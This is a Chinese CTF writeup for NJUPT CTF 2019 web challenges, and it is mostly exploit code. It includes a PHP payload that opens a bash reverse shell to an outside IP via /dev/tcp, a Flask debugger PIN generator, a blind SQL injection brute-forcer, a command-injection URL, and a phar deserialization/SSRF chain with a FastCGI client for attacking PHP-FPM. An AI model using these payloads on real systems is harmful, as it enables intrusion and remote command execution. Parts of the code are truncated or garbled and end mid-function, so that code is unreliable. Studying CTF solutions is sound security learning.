# NJUPT CTF 天璇Writeup
[TOC]
## Web
### hacker_backdoor
    import requests
    url = "http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();"
    print requests.post(url,data={'a':"""
    $descriptorspec=array(
        0=>array('pipe','r'), //STDIN
        1=>array('pipe','w'),//STDOUT
        2=>array('pipe','w') //STDERROR
    );
    $handle=proc_open('bash -c "bash -i >& /dev/tcp/122.152.230.160/2333 0>&1"',$descriptorspec,$pipes,NULL);
    var_dump($handle);
    """}).text
### simple XSS
随便注册后发现直接可以XSS，但是没有任何方向，这个时候admin账户被注册过了，想法是直接用admin的cookie登入，搭建好平台后，向admin发送XSS
payload，瞬间看到了admin的cookie.  
burp将其自己用户的COOKIE替换成为admin的cookie，得到flag：NCTF{Th1s_is_a_Simple_xss}
### flask_website
任意文件读+PIN-Debug，docker模式下machine-id有变化。更新脚本即可
    #!/usr/bin/python2.7
    #coding:utf-8n
    from sys import *
    import requests
    import re
    from itertools import chain
    import hashlib
    def genpin(mac,mid):
        probably_public_bits = [
            'ctf',# username
            'flask.app',# modname
            'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
            '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None),
        ]
        mac = "0x"+mac.replace(":","")
        mac = int(mac,16)
        private_bits = [
            str(mac),# str(uuid.getnode()),  /sys/class/net/eth0/address
            str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id
        ]
        h = hashlib.md5()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')
        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]
        rv =None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                for x in range(0, len(num), group_size))
                    break
            else:
                rv = num
        return rv
    # 02:42:ac:16:00:02  /sys/class/net/eth0/address
    # 21e83dfd-206c-4e80-86be-e8d0afc467a1  /proc/sys/kernel/random/boot_id
    def getcode(content):
        try:
            return re.findall(r"([\s\S]*)",content)[0].split()[0]
        except:
            return ''
    def getshell():
        print genpin("02:42:ac:16:00:02","8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46")
    if __name__ == '__main__':
        print(getshell())
### SQLi
原题
    import requests
    url = "http://nctf2019.x1ct34m.com:40005/index.php"
    flag = ""
    k = 0
    list = "qwertyuiopasdfghjklzxcvbnm_0123456789"
    while True:
        k+= 1
        print k,
        for i in list:
            p = len(requests.post(url,data={
                "passwd":"""||passwd/**/REGEXP/**/"^\\{}";\x00""".format(flag+i),
                "username":'\\'
            }).text)
            if p == 48:
                # print chr(i)
                flag += i
                print flag
                break
### easyphp
套娃题
>
> `http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q%20w%20q=c\at%20*`
### phar matches everything
Phar+SSRF+FPM
    test = '1';
        }
        public function funny_get(){
            return $this->test;
        }
    }
    class Main {
        public $url;
        public function curl($url){
            $ch = curl_init();  
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            $output=curl_exec($ch);
            curl_close($ch);
            return $output;
        }
        public function __destruct(){
            $this_is_a_easy_test=unserialize($_GET['careful']);
            if($this_is_a_easy_test->funny_get() === '1'){
                echo $this->curl($this->url);
            }
        }    
    }
    $a = new Easytest();
    echo urlencode(serialize($a));
    //O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D
    $m = new Main();
    $url = $argv[1];
    $m->url = "";
    #!coding=utf8
    import requests
    import re
    file = open('phar.phar')
    url1 = "http://nctf2019.x1ct34m.com:40004/upload.php"
    url2 = "http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D"
    def upload():
        content = requests.post(url1,files={"fileToUpload":('1.gif',file)}).text
        print content
        return re.findall(r"file (.*) has",content)[0].strip()
    def req(filename):
        print requests.post(url2,data={
            'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename),
            'submit':1
        }).text
    name = upload()
    print name
    req(name)
    import socket
    import random
    import argparse
    import sys
    from io import BytesIO
    # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
    PY2 = True if sys.version_info.major == 2 else False
    def bchr(i):
        if PY2:
            return force_bytes(chr(i))
        else:
            return bytes([i])
    def bord(c):
        if isinstance(c, int):
            return c
        else:
            return ord(c)
    def force_bytes(s):
        if isinstance(s, bytes):
            return s
        else:
            return s.encode('utf-8', 'strict')
    def force_text(s):
        if issubclass(type(s), str):
            return s
        if isinstance(s, bytes):
            s = str(s, 'utf-8', 'strict')
        else:
            s = str(s)
        return s
    class FastCGIClient:
        """A Fast-CGI Client for Python"""
        # private
        __FCGI_VERSION = 1
        __FCGI_ROLE_RESPONDER = 1
        __FCGI_ROLE_AUTHORIZER = 2
        __FCGI_ROLE_FILTER = 3
        __FCGI_TYPE_BEGIN = 1
        __FCGI_TYPE_ABORT = 2
        __FCGI_TYPE_END = 3
        __FCGI_TYPE_PARAMS = 4
        __FCGI_TYPE_STDIN = 5
        __FCGI_TYPE_STDOUT = 6
        __FCGI_TYPE_STDERR = 7
        __FCGI_TYPE_DATA = 8
        __FCGI_TYPE_GETVALUES = 9
        __FCGI_TYPE_GETVALUES_RESULT = 10
        __FCGI_TYPE_UNKOWNTYPE = 11
        __FCGI_HEADER_SIZE = 8
        # request state
        FCGI_STATE_SEND = 1
        FCGI_STATE_ERROR = 2
        FCGI_STATE_SUCCESS = 3
        def __init__(self, host, port, timeout, keepalive):
            self.host = host
            self.port = port
            self.timeout = timeout
            if keepalive:
                self.keepalive = 1
            else:
                self.keepalive = 0
            self.sock = None
            self.requests = dict()
        def __connect(self):
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # if self.keepalive:
            #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
            # else:
            #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
            try:
                self.sock.connect((self.host, int(self.port)))
            except socket.error as msg:
                self.sock.close()
                self.sock = None
                print(repr(msg))
                return False
            return True
        def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
            length = len(content)
            buf = bchr(FastCGIClient.__FCGI_VERSION) \
                   + bchr(fcgi_type) \
                   + bchr((requestid >> 8) & 0xFF) \
                   + bchr(requestid & 0xFF) \
                   + bchr((length >> 8) & 0xFF) \
                   + bchr(length & 0xFF) \
                   + bchr(0) \
                   + bchr(0) \
                   + content
            return buf
        def __encodeNameValueParams(self, name, value):
            nLen = len(name)
            vLen = len(value)
            record = b''
            if nLen > 24) | 0x80) \
                          + bchr((nLen >> 16) & 0xFF) \
                          + bchr((nLen >> 8) & 0xFF) \
                          + bchr(nLen & 0xFF)
            if vLen > 24) | 0x80) \
                          + bchr((vLen >> 16) & 0xFF) \
                          + bchr((vLen >> 8) & 0xFF) \
                          + bchr(vLen & 0xFF)
            return record + name + value
        def __decodeFastCGIHeader(self, stream):
            header = dict()
            header['version'] = bord(stream[0])
            header['type'] = bord(stream[1])
            header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
            header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
            header['paddingLength'] = bord(stream[6])
            header['reserved'] = bord(stream[7])
            return header
        def __decodeFastCGIRecord(self, buffer):
            header = buffer.read(int(self.__FCGI_HEADER_SIZE))
            if not header:
                return False
            else:
                record = self.__decodeFastCGIHeader(header)
                record['content'] = b''
                if 'contentLength' in record.keys():
                    contentLength = int(record['contentLength'])
                    record['content'] += buffer.read(contentLength)
                if 'paddingLength' in record.keys():
                    skiped = buffer.read(int(record['paddingLength']))
                return record
        def request(self, nameValuePairs={}, post=''):
            if not self.__connect():
                print('connect failure! please check your fasctcgi-server !!')
                return
            requestId = random.randint(1, (1 << 16) - 1)
            self.requests[requestId] = dict()
            request = b""
            beginFCGIRecordContent = bchr(0) \
                                     + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                     + bchr(self.keepalive) \
                                     + bchr(0) * 5
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                                  beginFCGIRecordContent, requestId)
            paramsRecord = b''
            if nameValuePairs:
                for (name, value) in nameValuePairs.items():
                    name = force_bytes(name)